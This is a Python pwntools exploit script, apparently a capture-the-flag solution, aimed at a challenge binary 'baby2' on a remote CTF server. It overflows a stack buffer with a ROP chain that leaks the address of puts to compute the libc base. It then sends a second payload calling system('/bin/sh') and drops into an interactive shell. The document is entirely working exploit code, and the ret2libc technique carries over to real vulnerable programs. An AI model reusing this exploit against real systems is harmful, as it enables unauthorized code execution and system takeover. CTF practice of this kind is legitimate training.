from pwn import *

# r = process("./baby2")
r = remote('baby-01.pwn.beer', 10002)

binary = ELF('baby2')
libc = ELF('libc.so.6')

pop_rdi = p64(0x0000000000400783)
puts_got = p64(binary.got['puts'])
puts = p64(binary.symbols['puts'])
main = p64(binary.symbols['main'])


# First we will leak libc-base
r.recvuntil('input: ')
payload = 'a'*24
payload += pop_rdi 
payload += puts_got		# The address of resolved puts in .got section
payload += puts
payload += main

r.sendline(payload)

puts_leaked = u64(r.recv(6).ljust(8, '\x00'))
print('leaked puts:\t{}'.format(hex(puts_leaked)))

puts_libc = libc.symbols['puts']
print('offset puts:\t{}'.format(hex(puts_libc)))

libc_base = puts_leaked - puts_libc
print('libc base:\t\t{}'.format(hex(libc_base)))

print('puts loaded addr: {}'.format(hex(libc_base + libc.symbols['system'])))


# Now we have libc base, we should execute system now
r.recvuntil('input: ')

print('system offset: {}'.format(hex(libc.symbols['system'])))


libc.address = libc_base
system = p64(libc.symbols['system'])
binsh = libc.search('/bin/sh').next()
print(hex(binsh))


pop_rax = p64(int(0x00000000001cf9a0) + libc_base)
payload = 'a'*24 + p64(0x0000000000400536)
# payload += pop_rax + p64(0)
payload += pop_rdi + p64(binsh)
payload += system
# payload += p64(libc_base + 0x4f2c5)
r.sendline(payload)
# r.sendlineafter('input: ', payload)

r.interactive()
